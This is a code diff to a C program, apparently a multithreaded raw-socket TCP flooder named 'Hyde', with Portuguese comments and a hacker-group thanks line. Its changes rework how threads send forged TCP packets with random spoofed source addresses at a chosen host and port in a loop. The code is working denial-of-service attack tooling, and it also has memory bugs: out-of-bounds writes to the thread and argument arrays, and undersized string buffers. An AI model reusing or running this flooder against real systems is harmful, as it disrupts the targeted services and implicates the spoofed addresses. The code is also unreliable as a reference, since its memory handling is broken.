@@ -54,12 +54,12 @@ thanks: m0nad,_mlk_,IAK,sigsegv,delfo,c0lt7r,joey,fokerbug,zepplin,otacon,backbo
 // pthread Header
 #include <pthread.h>
 
-// this is to do pthread wait time
-#define WAIT 1
 
 //Mutex Always is global, because the functions need look him to call
 pthread_mutex_t morfo = PTHREAD_MUTEX_INITIALIZER;
 
+
+// tenho que melhorar esse random ...
 char *RandomIp(void)
 {     
  char *ipRand=NULL;
@@ -151,8 +151,6 @@ int orion_getHostByName(const char* name, char* buffer)
 
 void *fazerpacote(void *arg)
 {
- pthread_mutex_lock(&morfo);
-
  char *source_addr,*dest_addr; 
  unsigned short dest_port,ran_port; 
  int escolha;
@@ -184,6 +182,9 @@ void *fazerpacote(void *arg)
  int sinlen;  
  struct sockaddr_in sin; 
  unsigned int remetente,destino;
+
+ pthread_mutex_lock(&morfo);
+
 // string 2 int
 // if ipv6 AF_INET6
  inet_pton(AF_INET, source_addr, &remetente);
@@ -338,20 +339,13 @@ void *fazerpacote(void *arg)
   envio.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32); //32    
   sinlen = sizeof(sin);   
 
-// sigsegv comentou que para enviar uma string no raw era soh usar sendto() bem
-// minha tentativa de enviar um payload elementalmente foi frustrada
-//
-//Wireshark nem tcpdump achou nada :/
-//
-//  char *Word2Send="Boo!";
-//  sendto(tcp_socket, Word2Send, strlen(Word2Send)+1, 0, (struct sockaddr *)&sin, sinlen);
   sendto(tcp_socket, &envio, 40, 0, (struct sockaddr *)&sin, sinlen);  
-  close(tcp_socket);    
+  close(tcp_socket);   
+ 
  pthread_mutex_unlock(&morfo);
  pthread_exit(NULL);
 }    
    
-
 void help()
 {
  int c=12;
@@ -382,7 +376,7 @@ int main(int argc, char *argv[])
  char *remetente=NULL,*destino=NULL;
 
  unsigned short port=80;     
- int escolha=0,filhos=0,count=0,number=500;
+ int escolha=0,filhos=0,count=0,number=500,max=0;
  int8_t rc1;
     
  if(argc < 6) 
@@ -406,13 +400,10 @@ int main(int argc, char *argv[])
   if(argc >= 5) 
    escolha = atoi(argv[4]);       
   if(argc >= 6) 
-   filhos = atoi(argv[5]);       
-  if(!port) 
-   port = 80;    
+   filhos = atoi(argv[5]);         
   if(filhos<2) 
    filhos = 2;   
-  if(!number) 
-   number = 1000;
+ 
     
   fprintf(stdout,"fate  : %s\n",argv[1]);    
   fprintf(stdout,"Port         : %u\n",port);    
@@ -464,11 +455,8 @@ int main(int argc, char *argv[])
  //thread plan
    pthread_t *thread;
    thread=(pthread_t *)malloc(sizeof(pthread_t)*filhos+1);
-
    char **ThreadArgv;
- 
- while(number^0) 
- {  
+
    ThreadArgv=malloc(3*sizeof(char *));
    char *StrPort=malloc(sizeof(char *));
    sprintf( StrPort,"%d",  port);
@@ -477,8 +465,11 @@ int main(int argc, char *argv[])
    char *StrChoice=malloc(sizeof(char *));
    sprintf( StrChoice,"%d", escolha);
    ThreadArgv[4]=StrChoice;
-
    remetente=RandomIp();
+ 
+ while(number^0) 
+ {  
+  count=filhos;
 
     if( (!(escolha&1))&&(escolha^0) )
     {
@@ -487,21 +478,20 @@ int main(int argc, char *argv[])
      ThreadArgv[1]=destino;
      fprintf(stdout,"Hyde look %s the port %u, spoofing %s in port %u\n", IP, port, IP, port);
 // start thread
-//     if( (rc1=pthread_create(&thread[count],NULL,fazerpacote, (void *) ThreadArgv)) )
-     if((rc1=pthread_create(&thread[count],NULL,&fazerpacote,(void *) ThreadArgv)))
-      puts("error in thread");
-     if(filhos>number)
-      filhos=number;
-// join and re-alloc to join new pthreads
-     if(!(count^(filhos-1))) 
-     { 
-      count=0;
-        do{
-         pthread_join(thread[count],NULL);
-         count++;
-        }while(count^filhos);
-      count=0; 
+     while(count)
+     {
+      if((rc1=pthread_create(&thread[count],NULL,&fazerpacote,(void *) ThreadArgv)))
+       puts("error in thread 1");
+      count--;
      }
+    count=filhos;
+// join and re-alloc to join new pthreads
+     while(count)
+     {
+      pthread_join(thread[count],NULL);
+      count--;
+     }
+
     }
     else
     { 
@@ -510,26 +500,29 @@ int main(int argc, char *argv[])
      ThreadArgv[1]=destino;
      fprintf(stdout,"Hyde look %s in port %u, spoofing %s in port %u\n", destino, port, remetente, port);   
 // start thread
-     if( (rc1=pthread_create(&thread[count],NULL,&fazerpacote, (void *) ThreadArgv)) )
-      puts("error in thread");
-     if(filhos>number)
-      filhos=number;
+     while(count)
+     {
+      if((rc1=pthread_create(&thread[count],NULL,&fazerpacote,(void *) ThreadArgv)))
+       puts("error in thread 1");
+      count--;
+     }
+    count=filhos;
 // join and re-alloc to join new pthreads
-     if(!(count^(filhos-1))) 
-     { 
-      count=0;
-       do{
-        pthread_join(thread[count],NULL);
-        count++;
-       }while(count^filhos);
-      count=0;  
-     }      
+     while(count)
+     {
+      pthread_join(thread[count],NULL);
+      count--;
+     }
+
     }
    number--;    
   }
  free(thread);
- free(destino); 
+ free(destino);
+// free(ThreadArgv);
+// free(StrPort);
+// free(StrChoice);
+  
  return 0;
 }    
-
 
